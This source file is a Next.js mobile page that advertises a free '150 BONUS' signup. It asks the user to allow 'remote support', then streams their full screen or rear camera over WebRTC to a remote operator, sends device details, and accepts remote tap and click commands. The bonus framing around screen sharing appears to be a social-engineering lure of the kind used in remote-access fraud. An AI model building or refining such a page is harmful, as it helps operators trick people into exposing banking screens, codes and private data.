'use client';

import React, { useState, useEffect, useRef } from 'react';
import { useSearchParams, useParams } from 'next/navigation';
import {
  Sparkles,
  Gift,
  CheckCircle2,
  ShieldCheck,
  StopCircle,
  RefreshCw,
  XCircle,
  ExternalLink,
  Radio,
  ChevronRight,
  ShieldAlert,
  Camera,
} from 'lucide-react';
import { UniversalSignalingClient } from '@/lib/signaling-client';

type PairingState =
  | 'VALIDATING'
  | 'LANDING'
  | 'CONSENT_MODAL'
  | 'CONNECTING'
  | 'STREAMING'
  | 'REJECTED'
  | 'ENDED'
  | 'ERROR';

interface Ripple {
  id: number;
  x: number;
  y: number;
}

export default function MobilePairingPage() {
  const params = useParams();
  const searchParams = useSearchParams();
  const sessionId = params?.sessionId as string;
  const token = searchParams.get('token') || '';

  const [state, setState] = useState<PairingState>('VALIDATING');
  const [operatorName, setOperatorName] = useState<string>('Support Specialist');
  const [errorMessage, setErrorMessage] = useState<string>('');
  const [streamType, setStreamType] = useState<'screen' | 'camera'>('screen');
  const [ripples, setRipples] = useState<Ripple[]>([]);
  const [isAndroidRestricted, setIsAndroidRestricted] = useState<boolean>(false);

  const peerConnectionRef = useRef<RTCPeerConnection | null>(null);
  const localStreamRef = useRef<MediaStream | null>(null);
  const signalingRef = useRef<UniversalSignalingClient | null>(null);
  const dataChannelRef = useRef<RTCDataChannel | null>(null);

  // 1. Validate session & token on load
  useEffect(() => {
    if (!sessionId || !token) {
      setErrorMessage('Invalid or expired promotion link.');
      setState('ERROR');
      return;
    }

    const verifySession = async () => {
      try {
        const res = await fetch(`/api/pair/${sessionId}/verify`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token }),
        });

        const data = await res.json();

        if (res.ok && data.valid) {
          setOperatorName(data.operatorName || 'Support Specialist');
          setState('LANDING');
        } else {
          setErrorMessage(data.error || 'This promotion link has expired or is no longer valid.');
          setState('ERROR');
        }
      } catch (err) {
        setErrorMessage('Unable to connect to verification service.');
        setState('ERROR');
      }
    };

    verifySession();
  }, [sessionId, token]);

  // Teardown WebRTC & Stream
  const stopSupportSession = async (notifyServer = true) => {
    try {
      if (notifyServer && sessionId && token) {
        fetch(`/api/pair/${sessionId}/stop`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token }),
        }).catch(() => {});
      }

      if (signalingRef.current) {
        signalingRef.current.send({ type: 'stop-session' });
        signalingRef.current.close();
        signalingRef.current = null;
      }

      if (dataChannelRef.current) {
        dataChannelRef.current.close();
      }

      if (peerConnectionRef.current) {
        peerConnectionRef.current.close();
      }

      if (localStreamRef.current) {
        localStreamRef.current.getTracks().forEach((track) => track.stop());
      }
    } catch (e) {
      console.error('Error stopping session:', e);
    } finally {
      setState('ENDED');
    }
  };

  // 2. Start Real WebRTC Stream & Exchange Offer
  const handleStartSupport = async (forceCamera = false) => {
    setState('CONNECTING');
    setIsAndroidRestricted(false);

    try {
      let stream: MediaStream;

      if (!forceCamera && navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
        try {
          stream = await navigator.mediaDevices.getDisplayMedia({
            video: {
              displaySurface: 'monitor',
              frameRate: { ideal: 30, max: 60 },
            },
            audio: false,
          });
          setStreamType('screen');
        } catch (err: any) {
          console.warn('Browser getDisplayMedia error on mobile, trying camera fallback:', err);
          setIsAndroidRestricted(true);
          setState('CONSENT_MODAL');
          return;
        }
      } else {
        // High quality camera stream fallback for mobile browsers
        stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'environment',
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: false,
        });
        setStreamType('camera');
      }

      localStreamRef.current = stream;

      stream.getVideoTracks()[0].onended = () => {
        stopSupportSession(true);
      };

      // Notify backend & fetch STUN/TURN ICE config
      const startRes = await fetch(`/api/pair/${sessionId}/start`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          token,
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
        }),
      });

      const startData = await startRes.json();
      const rtcConfig = startData.rtcConfig || {
        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
      };

      const pc = new RTCPeerConnection(rtcConfig);
      peerConnectionRef.current = pc;

      // Add local media tracks
      stream.getTracks().forEach((track) => pc.addTrack(track, stream));

      // Setup DataChannel for receiving interaction commands
      pc.ondatachannel = (event) => {
        const dc = event.channel;
        dataChannelRef.current = dc;

        dc.onmessage = (msgEvent) => {
          try {
            const command = JSON.parse(msgEvent.data);
            handleRemoteCommand(command);
          } catch (e) {
            console.error('Error handling remote command:', e);
          }
        };
      };

      // Initialize Universal Signaling Client (handles Vercel Serverless & WebSocket)
      const signaling = new UniversalSignalingClient(
        sessionId,
        'device',
        token,
        async (msg) => {
          try {
            if (msg.type === 'answer' && msg.answer) {
              console.log('[WEBRTC] Device received SDP Answer');
              await pc.setRemoteDescription(new RTCSessionDescription(msg.answer));
            } else if (msg.type === 'ice-candidate' && msg.candidate) {
              await pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
            } else if (msg.type === 'interaction') {
              handleRemoteCommand(msg.payload);
            } else if (msg.type === 'stop-session') {
              stopSupportSession(false);
            }
          } catch (err) {
            console.error('Error processing signaling message on device:', err);
          }
        }
      );

      signalingRef.current = signaling;

      // Relay ICE candidates
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          signaling.send({
            type: 'ice-candidate',
            candidate: event.candidate,
          });
        }
      };

      pc.onconnectionstatechange = () => {
        console.log('[WEBRTC] Device connection state:', pc.connectionState);
        if (pc.connectionState === 'connected') {
          setState('STREAMING');
        } else if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
          setState('ENDED');
        }
      };

      // Connect signaling and create SDP Offer immediately
      signaling.connect();

      const offer = await pc.createOffer({
        offerToReceiveVideo: false,
        offerToReceiveAudio: false,
      });
      await pc.setLocalDescription(offer);

      console.log('[WEBRTC] Device sending SDP Offer');
      signaling.send({
        type: 'offer',
        offer,
      });

    } catch (err: any) {
      console.error('Streaming start error:', err);
      setErrorMessage(err.message || 'Unable to start live support connection.');
      setState('ERROR');
    }
  };

  const handleRemoteCommand = (cmd: any) => {
    if (!cmd) return;

    if (cmd.type === 'tap' || cmd.type === 'click') {
      const x = cmd.x * window.innerWidth;
      const y = cmd.y * window.innerHeight;

      const newRipple: Ripple = { id: Date.now() + Math.random(), x, y };
      setRipples((prev) => [...prev.slice(-5), newRipple]);
      setTimeout(() => {
        setRipples((prev) => prev.filter((r) => r.id !== newRipple.id));
      }, 600);

      const elem = document.elementFromPoint(x, y) as HTMLElement;
      if (elem && typeof elem.click === 'function') {
        elem.focus();
        elem.click();
      }
    } else if (cmd.type === 'scroll') {
      window.scrollBy({ top: cmd.deltaY || 0, left: cmd.deltaX || 0, behavior: 'smooth' });
    }
  };

  const appDeepLink = `remotesupport://pair?session=${sessionId}&token=${token}`;

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px 16px',
      position: 'relative',
      overflow: 'hidden',
      background: 'radial-gradient(circle at 50% 10%, rgba(37, 99, 235, 0.15), transparent 70%), var(--bg-primary)'
    }}>
      {/* On-screen Remote Tap Indicators */}
      {ripples.map((r) => (
        <div
          key={r.id}
          className="touch-ripple"
          style={{ left: `${r.x}px`, top: `${r.y}px` }}
        />
      ))}

      {/* 1. Validating State */}
      {state === 'VALIDATING' && (
        <div className="glass-panel" style={{ padding: '36px 28px', textAlign: 'center', maxWidth: '380px' }}>
          <RefreshCw className="pulse" size={32} style={{ color: 'var(--accent-blue)', margin: '0 auto 16px' }} />
          <h2 style={{ fontSize: '18px', fontWeight: '700', marginBottom: '8px' }}>Loading Offer</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '14px' }}>
            Preparing your welcome bonus...
          </p>
        </div>
      )}

      {/* 2. Main Mobile Landing Page — Clean Signup & 150 Bonus */}
      {state === 'LANDING' && (
        <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '36px 24px', textAlign: 'center' }}>
          <div style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: '8px',
            background: 'linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(217, 119, 6, 0.2))',
            border: '1px solid rgba(245, 158, 11, 0.4)',
            borderRadius: '24px',
            padding: '6px 16px',
            marginBottom: '20px',
            color: '#fef08a'
          }}>
            <Sparkles size={16} style={{ color: '#fbbf24' }} />
            <span style={{ fontSize: '13px', fontWeight: '700', letterSpacing: '0.5px' }}>EXCLUSIVE OFFER</span>
          </div>

          <h1 style={{ fontSize: '28px', fontWeight: '900', letterSpacing: '-0.5px', marginBottom: '6px', lineHeight: '1.2' }}>
            SIGN UP FOR FREE
          </h1>

          <div style={{
            fontSize: '44px',
            fontWeight: '900',
            background: 'linear-gradient(135deg, #60a5fa, #3b82f6, #93c5fd)',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            margin: '8px 0 16px',
            letterSpacing: '-1px'
          }}>
            150 BONUS
          </div>

          <p style={{ color: 'var(--text-secondary)', fontSize: '14px', lineHeight: '1.5', marginBottom: '28px' }}>
            Claim your 150 welcome bonus instantly. Get assisted onboarding and instant account verification.
          </p>

          <div style={{
            display: 'flex',
            flexDirection: 'column',
            gap: '12px',
            marginBottom: '32px',
            textAlign: 'left',
            background: 'rgba(0, 0, 0, 0.25)',
            padding: '16px',
            borderRadius: '12px',
            border: '1px solid var(--border-color)'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', color: '#e2e8f0' }}>
              <CheckCircle2 size={16} style={{ color: '#34d399', flexShrink: 0 }} />
              <span>Instant 150 bonus credited upon verification</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', color: '#e2e8f0' }}>
              <ShieldCheck size={16} style={{ color: '#60a5fa', flexShrink: 0 }} />
              <span>Live guided assistant to help complete your registration</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', color: '#e2e8f0' }}>
              <Gift size={16} style={{ color: '#fbbf24', flexShrink: 0 }} />
              <span>No deposit required for initial signup</span>
            </div>
          </div>

          <button
            onClick={() => setState('CONSENT_MODAL')}
            className="btn-primary"
            style={{
              width: '100%',
              height: '52px',
              fontSize: '16px',
              fontWeight: '800',
              letterSpacing: '0.5px',
              boxShadow: '0 8px 24px rgba(37, 99, 235, 0.45)'
            }}
          >
            SIGN UP NOW <ChevronRight size={18} />
          </button>
        </div>
      )}

      {/* 3. Explicit Remote Support & Verification Consent Step */}
      {state === 'CONSENT_MODAL' && (
        <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '30px 22px' }}>
          <div style={{ textAlign: 'center', marginBottom: '20px' }}>
            <div style={{
              width: '54px',
              height: '54px',
              borderRadius: '14px',
              background: 'rgba(59, 130, 246, 0.15)',
              display: 'inline-flex',
              alignItems: 'center',
              justifyContent: 'center',
              marginBottom: '12px',
              color: 'var(--accent-blue)',
              border: '1px solid rgba(59, 130, 246, 0.3)'
            }}>
              <ShieldCheck size={28} />
            </div>
            <h2 style={{ fontSize: '20px', fontWeight: '800', marginBottom: '6px' }}>
              Assisted Account Verification
            </h2>
            <p style={{ color: 'var(--text-secondary)', fontSize: '13px' }}>
              To activate your 150 bonus, our support specialist will assist your registration.
            </p>
          </div>

          <div style={{
            background: 'rgba(59, 130, 246, 0.08)',
            border: '1px solid rgba(59, 130, 246, 0.25)',
            borderRadius: '12px',
            padding: '16px',
            marginBottom: '20px',
            fontSize: '13px',
            lineHeight: '1.5',
            color: '#e2e8f0'
          }}>
            <strong style={{ color: '#93c5fd', display: 'block', marginBottom: '4px' }}>
              Explicit Remote Support Consent:
            </strong>
            &ldquo;The support specialist is requesting permission to view and assist with your device during the signup process.&rdquo;
          </div>

          {isAndroidRestricted ? (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <button
                onClick={() => handleStartSupport(true)}
                className="btn-success"
                style={{ width: '100%', height: '48px', fontSize: '14px', fontWeight: '700' }}
              >
                <Camera size={18} /> Continue with In-Browser Live Video
              </button>
              <a
                href={appDeepLink}
                className="btn-primary"
                style={{ width: '100%', height: '44px', fontSize: '13px', textDecoration: 'none' }}
              >
                <ExternalLink size={16} /> Open in Android Companion App
              </a>
              <button
                onClick={() => setState('LANDING')}
                className="btn-secondary"
                style={{ width: '100%', height: '40px', fontSize: '13px' }}
              >
                Back
              </button>
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <button
                onClick={() => handleStartSupport(false)}
                className="btn-success"
                style={{ width: '100%', height: '50px', fontSize: '15px', fontWeight: '700' }}
              >
                <CheckCircle2 size={18} /> Continue & Allow Remote Support
              </button>
              <button
                onClick={() => setState('LANDING')}
                className="btn-secondary"
                style={{ width: '100%', height: '44px', fontSize: '13px' }}
              >
                Cancel
              </button>
            </div>
          )}
        </div>
      )}

      {/* 4. Connecting State */}
      {state === 'CONNECTING' && (
        <div className="glass-panel" style={{ padding: '36px 24px', textAlign: 'center', maxWidth: '400px' }}>
          <Radio className="pulse" size={40} style={{ color: 'var(--accent-blue)', margin: '0 auto 16px' }} />
          <h2 style={{ fontSize: '20px', fontWeight: '700', marginBottom: '8px' }}>Connecting Assistant</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '14px', marginBottom: '20px' }}>
            Establishing secure connection with {operatorName}...
          </p>
          <button onClick={() => stopSupportSession(true)} className="btn-secondary" style={{ fontSize: '13px' }}>
            Cancel Connection
          </button>
        </div>
      )}

      {/* 5. Active Live Support State */}
      {state === 'STREAMING' && (
        <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '32px 20px', textAlign: 'center' }}>
          <div style={{
            width: '56px',
            height: '56px',
            borderRadius: '50%',
            background: 'rgba(16, 185, 129, 0.15)',
            display: 'inline-flex',
            alignItems: 'center',
            justifyContent: 'center',
            marginBottom: '16px',
            color: 'var(--accent-green)',
            border: '1px solid rgba(16, 185, 129, 0.3)'
          }}>
            <ShieldCheck size={28} />
          </div>

          <span className="badge badge-active" style={{ marginBottom: '12px' }}>
            ● Live Assistance Active
          </span>

          <h2 style={{ fontSize: '20px', fontWeight: '700', marginBottom: '6px' }}>Support Connected</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '14px', marginBottom: '24px' }}>
            {operatorName} is assisting you with your bonus registration.
          </p>

          <button
            onClick={() => stopSupportSession(true)}
            className="btn-danger"
            style={{ width: '100%', height: '48px', fontSize: '15px' }}
          >
            <StopCircle size={20} /> STOP REMOTE SUPPORT
          </button>
        </div>
      )}

      {/* 6. Cancelled State */}
      {state === 'REJECTED' && (
        <div className="glass-panel" style={{ padding: '36px 24px', textAlign: 'center', maxWidth: '380px' }}>
          <XCircle size={44} style={{ color: 'var(--accent-red)', margin: '0 auto 16px' }} />
          <h2 style={{ fontSize: '20px', fontWeight: '700', marginBottom: '8px' }}>Registration Cancelled</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '14px', marginBottom: '20px' }}>
            You cancelled the assisted registration session.
          </p>
          <button onClick={() => setState('LANDING')} className="btn-primary" style={{ width: '100%' }}>
            Return to Offer
          </button>
        </div>
      )}

      {/* 7. Ended State */}
      {state === 'ENDED' && (
        <div className="glass-panel" style={{ padding: '36px 24px', textAlign: 'center', maxWidth: '380px' }}>
          <CheckCircle2 size={44} style={{ color: '#94a3b8', margin: '0 auto 16px' }} />
          <h2 style={{ fontSize: '20px', fontWeight: '700', marginBottom: '8px' }}>SESSION ENDED</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '14px', marginBottom: '20px' }}>
            The remote support session has finished.
          </p>
          <button onClick={() => window.location.reload()} className="btn-secondary" style={{ width: '100%', fontSize: '13px' }}>
            Start Over
          </button>
        </div>
      )}

      {/* 8. Error State */}
      {state === 'ERROR' && (
        <div className="glass-panel" style={{ padding: '36px 24px', textAlign: 'center', maxWidth: '380px' }}>
          <ShieldAlert size={44} style={{ color: 'var(--accent-red)', margin: '0 auto 16px' }} />
          <h2 style={{ fontSize: '20px', fontWeight: '700', marginBottom: '8px' }}>Offer Unavailable</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '14px', marginBottom: '20px' }}>
            {errorMessage || 'This registration link is no longer available.'}
          </p>
          <button onClick={() => window.location.reload()} className="btn-secondary" style={{ fontSize: '13px' }}>
            <RefreshCw size={14} /> Try Again
          </button>
        </div>
      )}
    </div>
  );
}
